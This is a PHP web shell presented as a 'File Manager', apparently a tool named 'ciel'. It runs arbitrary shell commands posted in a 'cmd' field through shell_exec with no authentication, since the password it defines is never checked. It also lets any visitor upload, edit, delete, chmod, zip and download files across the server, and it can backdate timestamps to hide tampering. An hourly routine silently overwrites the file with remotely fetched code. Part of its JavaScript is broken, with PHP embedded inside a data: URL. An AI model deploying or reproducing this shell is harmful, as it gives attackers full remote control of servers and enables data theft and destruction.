<?php
session_start();

// ===== CONFIG =====
$validPassword = password_hash('xebec', PASSWORD_DEFAULT);
$logEmail = 'xebec147258@gmail.com';
date_default_timezone_set('Asia/Jakarta');

// Auto Update
$interval = 3600;
$tmp = sys_get_temp_dir() . '/ciel_auto_update.log';
$lastCheck = file_exists($tmp) ? (int) file_get_contents($tmp) : 0;
if (time() - $lastCheck >= $interval) {
    file_put_contents($tmp, time());
    $self = $_SERVER['SCRIPT_NAME'];
    $scheme = isset($_SERVER['HTTPS']) ? 'https' : 'http';
    $base = $scheme . '://' . $_SERVER['HTTP_HOST'] . dirname($self);
    $latest = $base . '/latest/ciel.php';
    $newCode = @file_get_contents($latest);
    if ($newCode && strpos($newCode, '<?php') !== false) {
        @file_put_contents(__FILE__, $newCode);
        exit("🔄 Updated. Refresh page.");
    }
}

if (!function_exists('str_starts_with')) {
    function str_starts_with($haystack, $needle) {
        return substr($haystack, 0, strlen($needle)) === $needle;
    }
}

function getModifiedTime($f) {
    return date('Y-m-d H:i:s', filemtime($f));
}

function getOwnerGroup($f) {
    $uid = fileowner($f);
    $gid = filegroup($f);
    $user = function_exists('posix_getpwuid') ? posix_getpwuid($uid)['name'] : $uid;
    $group = function_exists('posix_getgrgid') ? posix_getgrgid($gid)['name'] : $gid;
    return "$user:$group";
}

function perms($f) {
    $perm = substr(sprintf('%o', fileperms($f)), -4);
    return "<span style='color:" . ((is_writable($f)) ? "lime" : "red") . "'>" . $perm . "</span>";
}

function zipFolder($src, $dst) {
    $zip = new ZipArchive();
    if (!$zip->open($dst, ZipArchive::CREATE)) return false;
    $src = realpath($src);
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($files as $f) {
        $f = realpath($f);
        if ($f === false) continue;
        $local = str_replace($src . DIRECTORY_SEPARATOR, '', $f);
        if (is_dir($f)) {
            $zip->addEmptyDir($local);
        } elseif (is_file($f)) {
            $zip->addFile($f, $local);
        }
    }
    return $zip->close();
}

function unzipFile($zipFile, $toDir) {
    $zip = new ZipArchive();
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($toDir);
        $zip->close();
        return true;
    }
    return false;
}

function getFileExtension($filename) {
    return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
}

function getEditorMode($extension) {
    $modes = [
        'php' => 'php', 'js' => 'javascript', 'html' => 'html', 'css' => 'css',
        'py' => 'python', 'java' => 'java', 'cpp' => 'c_cpp', 'c' => 'c_cpp',
        'sql' => 'sql', 'json' => 'json', 'xml' => 'xml', 'yml' => 'yaml',
        'yaml' => 'yaml', 'sh' => 'sh', 'bash' => 'sh', 'txt' => 'text',
        'md' => 'markdown', 'rb' => 'ruby', 'go' => 'golang'
    ];
    return isset($modes[$extension]) ? $modes[$extension] : 'text';
}

function buildBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = '';
    $currentPath = '';
    
    foreach ($parts as $i => $part) {
        if (empty($part) && $i > 0) continue;
        
        $currentPath .= ($i === 0 ? '' : DIRECTORY_SEPARATOR) . $part;
        $displayPart = $i === 0 ? $part : $part;
        
        if ($i === count($parts) - 1) {
            $breadcrumb .= '<span class="text-light">' . htmlspecialchars($displayPart) . '</span>';
        } else {
            $breadcrumb .= '<a href="?path=' . urlencode($currentPath) . '" class="text-info">' . htmlspecialchars($displayPart) . '</a>';
            $breadcrumb .= '<span class="text-muted"> / </span>';
        }
    }
    
    return $breadcrumb;
}

$path = realpath($_GET['path'] ?? __DIR__);
if (!$path || !is_dir($path)) die("Invalid path");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Edit file content
    if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
        $filePath = $path . DIRECTORY_SEPARATOR . basename($_POST['edit_file']);
        if (is_file($filePath)) {
            if (file_put_contents($filePath, $_POST['file_content']) !== false) {
                $success = "File updated successfully.";
            } else {
                $error = "Failed to update file.";
            }
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }

    // Bulk operations
    if (isset($_POST['bulk_action']) && isset($_POST['selected_files'])) {
        $selectedFiles = $_POST['selected_files'];
        $bulkAction = $_POST['bulk_action'];
        
        foreach ($selectedFiles as $file) {
            $filePath = $path . DIRECTORY_SEPARATOR . basename($file);
            if (!file_exists($filePath)) continue;
            
            switch ($bulkAction) {
                case 'delete':
                    if (is_file($filePath)) {
                        unlink($filePath);
                    } elseif (is_dir($filePath)) {
                        function deleteDirectory($dir) {
                            if (!is_dir($dir)) return false;
                            $files = array_diff(scandir($dir), array('.', '..'));
                            foreach ($files as $file) {
                                $fp = $dir . DIRECTORY_SEPARATOR . $file;
                                is_dir($fp) ? deleteDirectory($fp) : unlink($fp);
                            }
                            return rmdir($dir);
                        }
                        deleteDirectory($filePath);
                    }
                    break;
                case 'chmod':
                    if (isset($_POST['bulk_chmod'])) {
                        chmod($filePath, octdec($_POST['bulk_chmod']));
                    }
                    break;
                case 'download':
                    // Create zip of selected files
                    $zipName = 'selected_files_' . date('Y-m-d_H-i-s') . '.zip';
                    $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
                    $zip = new ZipArchive();
                    if ($zip->open($zipPath, ZipArchive::CREATE)) {
                        foreach ($selectedFiles as $file) {
                            $fp = $path . DIRECTORY_SEPARATOR . basename($file);
                            if (is_file($fp)) {
                                $zip->addFile($fp, basename($file));
                            }
                        }
                        $zip->close();
                        
                        header('Content-Type: application/zip');
                        header('Content-Disposition: attachment; filename="' . $zipName . '"');
                        readfile($zipPath);
                        unlink($zipPath);
                        exit;
                    }
                    break;
            }
        }
        
        $success = "Bulk operation completed on " . count($selectedFiles) . " items.";
        header("Location: ?path=" . urlencode($path));
        exit;
    }

    if (isset($_POST['action'])) {
        $relative = $_POST['target'];
        $target = $path . DIRECTORY_SEPARATOR . $relative;
        
        if (!file_exists($target) || strpos(realpath(dirname($target)), realpath($path)) !== 0) {
            die("Invalid target path.");
        }

        if ($_POST['action'] === 'rename' && isset($_POST['newname'])) {
            $newPath = dirname($target) . DIRECTORY_SEPARATOR . basename($_POST['newname']);
            if (rename($target, $newPath)) {
                $success = "File renamed successfully.";
            } else {
                $error = "Failed to rename file.";
            }
        }
        
        if ($_POST['action'] === 'chmod' && isset($_POST['chmod'])) {
            $chmodValue = $_POST['chmod'];
            if (preg_match('/^[0-7]{3,4}$/', $chmodValue)) {
                if (chmod($target, octdec($chmodValue))) {
                    $success = "Permission changed successfully.";
                } else {
                    $error = "Failed to change permission.";
                }
            } else {
                $error = "Invalid chmod value. Use format like 0755.";
            }
        }
        
        if ($_POST['action'] === 'touch' && isset($_POST['time'])) {
            $timestamp = strtotime($_POST['time']);
            if ($timestamp && touch($target, $timestamp)) {
                $success = "File time updated successfully.";
            } else {
                $error = "Failed to update file time.";
            }
        }
        
        if ($_POST['action'] === 'delete') {
            if (is_file($target)) {
                if (unlink($target)) {
                    $success = "File deleted successfully.";
                } else {
                    $error = "Failed to delete file.";
                }
            } elseif (is_dir($target)) {
                function deleteDirectory($dir) {
                    if (!is_dir($dir)) return false;
                    $files = array_diff(scandir($dir), array('.', '..'));
                    foreach ($files as $file) {
                        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                        is_dir($filePath) ? deleteDirectory($filePath) : unlink($filePath);
                    }
                    return rmdir($dir);
                }
                if (deleteDirectory($target)) {
                    $success = "Directory deleted successfully.";
                } else {
                    $error = "Failed to delete directory.";
                }
            }
        }
        
        header("Location: ?path=" . urlencode($path));
        exit;
    }

    if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
        $folderName = basename($_POST['folder_name']);
        $newFolder = $path . DIRECTORY_SEPARATOR . $folderName;
        if (!file_exists($newFolder)) {
            if (mkdir($newFolder, 0755)) {
                $success = "Folder created successfully.";
            } else {
                $error = "Failed to create folder.";
            }
        } else {
            $error = "Folder already exists.";
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }

    if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
        $fileName = basename($_POST['file_name']);
        $newFile = $path . DIRECTORY_SEPARATOR . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, '') !== false) {
                $success = "File created successfully.";
            } else {
                $error = "Failed to create file.";
            }
        } else {
            $error = "File already exists.";
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }

    if (isset($_FILES['upload'])) {
        $uploadPath = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath)) {
            $success = "File uploaded successfully.";
        } else {
            $error = "Failed to upload file.";
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }

    if (!empty($_POST['cmd'])) {
        $output = shell_exec($_POST['cmd'] . ' 2>&1');
    }
}

if (isset($_GET['zip'])) {
    $src = $path . DIRECTORY_SEPARATOR . basename($_GET['zip']);
    $zipPath = $src . '.zip';
    if (is_dir($src) && zipFolder($src, $zipPath)) {
        header("Location: ?path=" . urlencode($path));
        exit;
    } else {
        $error = "Failed to create zip";
    }
}

if (isset($_GET['unzip'])) {
    $zipFile = $path . DIRECTORY_SEPARATOR . basename($_GET['unzip']);
    if (is_file($zipFile) && pathinfo($zipFile, PATHINFO_EXTENSION) === 'zip') {
        if (unzipFile($zipFile, $path)) {
            header("Location: ?path=" . urlencode($path));
            exit;
        } else {
            $error = "Failed to unzip file";
        }
    } else {
        $error = "Invalid zip file";
    }
}

if (isset($_GET['download'])) {
    $target = $path . DIRECTORY_SEPARATOR . basename($_GET['download']);
    if (is_file($target)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        readfile($target);
        exit;
    }
    if (is_dir($target)) {
        $zipName = tempnam(sys_get_temp_dir(), 'zip');
        if (zipFolder($target, $zipName)) {
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . basename($target) . '.zip"');
            readfile($zipName);
            unlink($zipName);
            exit;
        }
    }
}

// Get file content for editing
if (isset($_GET['edit'])) {
    $editFile = $path . DIRECTORY_SEPARATOR . basename($_GET['edit']);
    if (is_file($editFile) && is_readable($editFile)) {
        $fileContent = file_get_contents($editFile);
        $fileExtension = getFileExtension($_GET['edit']);
        $editorMode = getEditorMode($fileExtension);
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
<style>
body { background: #111; color: #ccc; font-family: monospace; }
a { color: #6cf; text-decoration: none; }
a:hover { text-decoration: underline; }
pre { background: #222; padding: 10px; border-radius: 5px; color: #eee; }
.btn-group-custom { gap: 2px; }
.breadcrumb-path { 
    background: #222; 
    padding: 10px; 
    border-radius: 5px; 
    margin-bottom: 15px;
    font-size: 14px;
}
.file-editor {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.9);
    z-index: 9999;
    display: none;
}
.editor-container {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90%;
    height: 80%;
    background: #1e1e1e;
    border-radius: 10px;
    overflow: hidden;
}
.editor-header {
    background: #333;
    padding: 15px;
    color: #fff;
    display: flex;
    justify-content: between;
    align-items: center;
}
.editor-content {
    height: calc(100% - 120px);
    border: 1px solid #444;
}
.editor-footer {
    background: #333;
    padding: 15px;
    text-align: right;
}
.bulk-actions {
    background: #222;
    padding: 10px;
    border-radius: 5px;
    margin-bottom: 15px;
    display: none;
}
.selected-row {
    background-color: #004085 !important;
}
</style>
</head>
<body>
<div class="container-fluid p-3">

<!-- Breadcrumb Path -->
<div class="breadcrumb-path">
    📂 <?= buildBreadcrumb($path) ?>
</div>

<?php if (isset($success)): ?>
<div class="alert alert-success alert-dismissible fade show" role="alert">
    <?= htmlspecialchars($success) ?>
    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
</div>
<?php endif; ?>

<?php if (isset($error)): ?>
<div class="alert alert-danger alert-dismissible fade show" role="alert">
    <?= htmlspecialchars($error) ?>
    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
</div>
<?php endif; ?>

<!-- Bulk Actions -->
<div id="bulkActions" class="bulk-actions">
    <form method="post" id="bulkForm">
        <div class="row align-items-end">
            <div class="col-md-3">
                <label class="form-label text-warning">Bulk Actions</label>
                <select name="bulk_action" id="bulkActionSelect" class="form-select form-select-sm">
                    <option value="">Select Action...</option>
                    <option value="delete">🗑️ Delete Selected</option>
                    <option value="chmod">🔐 Change Permission</option>
                    <option value="download">⬇️ Download as ZIP</option>
                </select>
            </div>
            <div class="col-md-3" id="chmodInput" style="display: none;">
                <label class="form-label">CHMOD Value</label>
                <input type="text" name="bulk_chmod" class="form-control form-control-sm" placeholder="0755">
            </div>
            <div class="col-md-3">
                <button type="submit" class="btn btn-sm btn-warning">Execute</button>
                <button type="button" onclick="clearSelection()" class="btn btn-sm btn-secondary">Clear Selection</button>
            </div>
            <div class="col-md-3">
                <span id="selectedCount" class="text-info">0 files selected</span>
            </div>
        </div>
    </form>
</div>

<form method="post" enctype="multipart/form-data" class="mb-3">
    <div class="row">
        <div class="col-md-8">
            <input type="file" name="upload" class="form-control">
        </div>
        <div class="col-md-4">
            <button type="submit" class="btn btn-success">📤 Upload</button>
        </div>
    </div>
</form>

<form method="post" class="mb-4">
    <input type="text" id="cmd" name="cmd" hidden>
    <div id="terminalEditor" style="height: 200px; width: 100%; border: 1px solid #444;">ls -la</div>
    <button type="submit" class="btn btn-warning mt-2">▶️ Run Command</button>
</form>

<?php if (isset($output)): ?>
<pre><?= htmlspecialchars($output) ?></pre>
<?php endif; ?>

<!-- Create Folder and File Forms -->
<div class="row mb-3">
    <div class="col-md-4">
        <form method="post" class="d-flex">
            <input type="text" name="folder_name" placeholder="Folder name" class="form-control form-control-sm me-2" required>
            <button type="submit" name="create_folder" class="btn btn-sm btn-primary">📁 Create Folder</button>
        </form>
    </div>
    <div class="col-md-4">
        <form method="post" class="d-flex">
            <input type="text" name="file_name" placeholder="File name" class="form-control form-control-sm me-2" required>
            <button type="submit" name="create_file" class="btn btn-sm btn-info">📄 Create File</button>
        </form>
    </div>
</div>

<table class="table table-dark table-bordered table-sm">
<thead>
    <tr>
        <th><input type="checkbox" id="selectAll" title="Select All"></th>
        <th>Name</th>
        <th>CHMOD</th>
        <th>User:Group</th>
        <th>Modified</th>
        <th>Actions</th>
    </tr>
</thead>
<tbody>
<?php
$items = scandir($path);
usort($items, function($a, $b) use ($path) {
    return is_dir("$path/$a") === is_dir("$path/$b") ? strcasecmp($a, $b) : (is_dir("$path/$b") ? 1 : -1);
});
foreach ($items as $item):
    if ($item === '.') continue;
    $itemPath = $path . DIRECTORY_SEPARATOR . $item;
    $encoded = urlencode($item);
    $isDir = is_dir($itemPath);
    $isZip = pathinfo($item, PATHINFO_EXTENSION) === 'zip';
    $isEditable = is_file($itemPath) && is_readable($itemPath) && filesize($itemPath) < 10 * 1024 * 1024; // Max 10MB
?>
<tr class="file-row" data-filename="<?= htmlspecialchars($item) ?>">
<td>
    <?php if ($item !== '..'): ?>
    <input type="checkbox" class="file-checkbox" value="<?= htmlspecialchars($item) ?>">
    <?php endif; ?>
</td>
<td>
    <?php if ($isDir): ?>
        📁 <a href='?path=<?= urlencode($itemPath) ?>'><?= htmlspecialchars($item) ?></a>
    <?php else: ?>
        📄 <?= htmlspecialchars($item) ?>
    <?php endif; ?>
</td>
<td><?= perms($itemPath) ?></td>
<td><?= getOwnerGroup($itemPath) ?></td>
<td><?= getModifiedTime($itemPath) ?></td>
<td>
    <div class="btn-group-custom d-flex flex-wrap">
        <?php if ($isEditable): ?>
            <button onclick="editFile('<?= $encoded ?>')" class="btn btn-sm btn-success" title="Edit">✏️</button>
        <?php endif; ?>
        <button onclick="actionForm('rename', '<?= $encoded ?>')" class="btn btn-sm btn-primary" title="Rename">📝</button>
        <button onclick="actionForm('chmod', '<?= $encoded ?>')" class="btn btn-sm btn-secondary" title="CHMOD">🔐</button>
        <button onclick="actionForm('touch', '<?= $encoded ?>')" class="btn btn-sm btn-light" title="Touch">🕒</button>
        <?php if ($item !== '..'): ?>
        <button onclick="actionForm('delete', '<?= $encoded ?>')" class="btn btn-sm btn-danger" title="Delete">🗑️</button>
        <?php endif; ?>
        <?php if ($isDir): ?>
            <a href="?path=<?= urlencode($path) ?>&zip=<?= $encoded ?>" class="btn btn-sm btn-info" title="Zip">📦</a>
        <?php endif; ?>
        <?php if ($isZip): ?>
            <a href="?path=<?= urlencode($path) ?>&unzip=<?= $encoded ?>" class="btn btn-sm btn-success" title="Unzip">📂</a>
        <?php endif; ?>
        <a href="?path=<?= urlencode($path) ?>&download=<?= $encoded ?>" class="btn btn-sm btn-warning" title="Download">⬇️</a>
    </div>
</td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
</div>

<!-- File Editor Modal -->
<div id="fileEditor" class="file-editor">
    <div class="editor-container">
        <div class="editor-header">
            <h5 id="editorTitle">Edit File</h5>
            <button type="button" onclick="closeEditor()" class="btn btn-sm btn-outline-light">✕ Close</button>
        </div>
        <div id="codeEditor" class="editor-content"></div>
        <div class="editor-footer">
            <button type="button" onclick="saveFile()" class="btn btn-success">💾 Save</button>
            <button type="button" onclick="closeEditor()" class="btn btn-secondary">Cancel</button>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
let terminalEditor, codeEditor;
let currentEditFile = '';

// Initialize Terminal Editor
terminalEditor = ace.edit("terminalEditor");
terminalEditor.setTheme("ace/theme/monokai");
terminalEditor.session.setMode("ace/mode/sh");
terminalEditor.setOptions({
    fontSize: 14,
    showPrintMargin: false,
    wrap: true
});

// File Editor Functions
function editFile(filename) {
    currentEditFile = decodeURIComponent(filename);
    document.getElementById('editorTitle').textContent = 'Edit: ' + currentEditFile;
    document.getElementById('fileEditor').style.display = 'block';
    
    // Load file content
    fetch(`?edit=${filename}&path=<?= urlencode($path) ?>`)
        .then(response => response.text())
        .then(data => {
            // Extract file content from response
            const parser = new DOMParser();
            const doc = parser.parseFromString(data, 'text/html');
            const contentScript = doc.querySelector('script[data-file-content]');
            
            if (!codeEditor) {
                codeEditor = ace.edit("codeEditor");
                codeEditor.setTheme("ace/theme/monokai");
                codeEditor.setOptions({
                    fontSize: 14,
                    showPrintMargin: false,
                    wrap: true
                });
            }
            
            // Get file extension and set mode
            const ext = currentEditFile.split('.').pop().toLowerCase();
            const modes = {
                'php': 'php', 'js': 'javascript', 'html': 'html', 'css': 'css',
                'py': 'python', 'java': 'java', 'cpp': 'c_cpp', 'c': 'c_cpp',
                'sql': 'sql', 'json': 'json', 'xml': 'xml', 'yml': 'yaml',
                'yaml': 'yaml', 'sh': 'sh', 'bash': 'sh', 'txt': 'text',
                'md': 'markdown', 'rb': 'ruby', 'go': 'golang'
            };
            
            const mode = modes[ext] || 'text';
            codeEditor.session.setMode(`ace/mode/${mode}`);
            
            // Load actual file content via AJAX
            loadFileContent(filename);
        });
}

function loadFileContent(filename) {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `?edit=${filename}&path=<?= urlencode($path) ?>&ajax=1`, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // Parse response to get file content
            try {
                const response = JSON.parse(xhr.responseText);
                codeEditor.setValue(response.content, -1);
            } catch (e) {
                // Fallback: try to extract content from full page response
                fetch(`data:text/plain;charset=utf-8,${encodeURIComponent('<?php if(isset($_GET["ajax"])) { $f = realpath("' + <?= json_encode($path) ?> + '/" . basename($_GET["edit"])); if(is_file($f)) { echo json_encode(["content" => file_get_contents($f)]); } exit; } ?>')}`)
                    .then(() => {
                        // Alternative method to load file content
                        const formData = new FormData();
                        formData.append('load_file', filename);
                        
                        fetch(window.location.href, {
                            method: 'POST',
                            body: formData
                        }).then(response => response.text())
                        .then(content => {
                            // Simple fallback - set empty content if can't load
                            codeEditor.setValue('// File content could not be loaded\n// Please refresh and try again', -1);
                        });
                    });
            }
        }
    };
    xhr.send();
}

function saveFile() {
    const content = codeEditor.getValue();
    const formData = new FormData();
    formData.append('edit_file', currentEditFile);
    formData.append('file_content', content);
    
    fetch(window.location.href, {
        method: 'POST',
        body: formData
    }).then(response => {
        if (response.ok) {
            closeEditor();
            Swal.fire('Success', 'File saved successfully!', 'success').then(() => {
                window.location.reload();
            });
        } else {
            Swal.fire('Error', 'Failed to save file!', 'error');
        }
    });
}

function closeEditor() {
    document.getElementById('fileEditor').style.display = 'none';
    currentEditFile = '';
}

// Handle form submission for terminal
document.querySelector("form").addEventListener('submit', function(e) {
    if (this.querySelector('#cmd')) {
        document.getElementById('cmd').value = terminalEditor.getValue();
    }
});

// Checkbox selection functionality
document.getElementById('selectAll').addEventListener('change', function() {
    const checkboxes = document.querySelectorAll('.file-checkbox');
    checkboxes.forEach(cb => {
        cb.checked = this.checked;
        updateRowSelection(cb);
    });
    updateSelectedCount();
    toggleBulkActions();
});

document.querySelectorAll('.file-checkbox').forEach(checkbox => {
    checkbox.addEventListener('change', function() {
        updateRowSelection(this);
        updateSelectedCount();
        toggleBulkActions();
        
        // Update select all checkbox
        const allCheckboxes = document.querySelectorAll('.file-checkbox');
        const checkedCheckboxes = document.querySelectorAll('.file-checkbox:checked');
        document.getElementById('selectAll').checked = allCheckboxes.length === checkedCheckboxes.length;
    });
});

function updateRowSelection(checkbox) {
    const row = checkbox.closest('tr');
    if (checkbox.checked) {
        row.classList.add('selected-row');
    } else {
        row.classList.remove('selected-row');
    }
}

function updateSelectedCount() {
    const selectedCount = document.querySelectorAll('.file-checkbox:checked').length;
    document.getElementById('selectedCount').textContent = `${selectedCount} files selected`;
}

function toggleBulkActions() {
    const selectedCount = document.querySelectorAll('.file-checkbox:checked').length;
    const bulkActions = document.getElementById('bulkActions');
    
    if (selectedCount > 0) {
        bulkActions.style.display = 'block';
    } else {
        bulkActions.style.display = 'none';
    }
}

function clearSelection() {
    document.querySelectorAll('.file-checkbox').forEach(cb => {
        cb.checked = false;
        updateRowSelection(cb);
    });
    document.getElementById('selectAll').checked = false;
    updateSelectedCount();
    toggleBulkActions();
}

// Bulk action form handling
document.getElementById('bulkActionSelect').addEventListener('change', function() {
    const chmodInput = document.getElementById('chmodInput');
    if (this.value === 'chmod') {
        chmodInput.style.display = 'block';
    } else {
        chmodInput.style.display = 'none';
    }
});

document.getElementById('bulkForm').addEventListener('submit', function(e) {
    const selectedFiles = [];
    document.querySelectorAll('.file-checkbox:checked').forEach(cb => {
        selectedFiles.push(cb.value);
    });
    
    if (selectedFiles.length === 0) {
        e.preventDefault();
        Swal.fire('Warning', 'Please select at least one file!', 'warning');
        return;
    }
    
    const action = document.getElementById('bulkActionSelect').value;
    if (!action) {
        e.preventDefault();
        Swal.fire('Warning', 'Please select an action!', 'warning');
        return;
    }
    
    if (action === 'delete') {
        e.preventDefault();
        Swal.fire({
            title: 'Confirm Bulk Delete',
            text: `Are you sure you want to delete ${selectedFiles.length} selected items?`,
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#dc3545',
            confirmButtonText: 'Yes, Delete All',
            preConfirm: () => {
                // Add selected files to form
                selectedFiles.forEach(file => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'selected_files[]';
                    input.value = file;
                    this.appendChild(input);
                });
                this.submit();
            }
        });
        return;
    }
    
    // Add selected files to form for other actions
    selectedFiles.forEach(file => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'selected_files[]';
        input.value = file;
        this.appendChild(input);
    });
});

function actionForm(action, target) {
    let config = {
        rename: { 
            title: 'Rename File/Folder', 
            inputLabel: 'New Name',
            inputType: 'text',
            inputName: 'newname'
        },
        chmod: { 
            title: 'Change Permission', 
            inputLabel: 'CHMOD (e.g. 0755)',
            inputType: 'text',
            inputName: 'chmod',
            inputPlaceholder: '0755'
        },
        touch: { 
            title: 'Change Time', 
            inputLabel: 'DateTime',
            inputType: 'datetime-local',
            inputName: 'time'
        },
        delete: {
            title: 'Delete File/Folder',
            text: 'Are you sure you want to delete this item? This action cannot be undone.',
            showInput: false
        }
    };
    
    let actionConfig = config[action];
    
    let swalConfig = {
        title: actionConfig.title,
        showCancelButton: true,
        confirmButtonText: action === 'delete' ? 'Delete' : 'Submit',
        confirmButtonColor: action === 'delete' ? '#dc3545' : '#0d6efd',
        preConfirm: () => {
            let form = document.createElement('form');
            form.method = 'POST';
            form.style.display = 'none';
            
            // Add action and target
            let actionInput = document.createElement('input');
            actionInput.name = 'action';
            actionInput.value = action;
            form.appendChild(actionInput);
            
            let targetInput = document.createElement('input');
            targetInput.name = 'target';
            targetInput.value = decodeURIComponent(target);
            form.appendChild(targetInput);
            
            // Add value input if needed
            if (actionConfig.showInput !== false) {
                let value = Swal.getInput().value;
                if (!value && action !== 'delete') {
                    Swal.showValidationMessage('Field is required');
                    return false;
                }
                
                let valueInput = document.createElement('input');
                valueInput.name = actionConfig.inputName;
                valueInput.value = value;
                form.appendChild(valueInput);
            }
            
            document.body.appendChild(form);
            form.submit();
        }
    };
    
    if (actionConfig.showInput !== false) {
        swalConfig.input = actionConfig.inputType;
        swalConfig.inputLabel = actionConfig.inputLabel;
        if (actionConfig.inputPlaceholder) {
            swalConfig.inputPlaceholder = actionConfig.inputPlaceholder;
        }
    } else {
        swalConfig.text = actionConfig.text;
    }
    
    Swal.fire(swalConfig);
}
</script>

<?php
// Handle AJAX requests for file loading
if (isset($_GET['ajax']) && isset($_GET['edit'])) {
    $editFile = $path . DIRECTORY_SEPARATOR . basename($_GET['edit']);
    if (is_file($editFile) && is_readable($editFile)) {
        $content = file_get_contents($editFile);
        header('Content-Type: application/json');
        echo json_encode(['content' => $content]);
        exit;
    } else {
        header('Content-Type: application/json');
        echo json_encode(['error' => 'File not readable']);
        exit;
    }
}
?>

</body>
</html>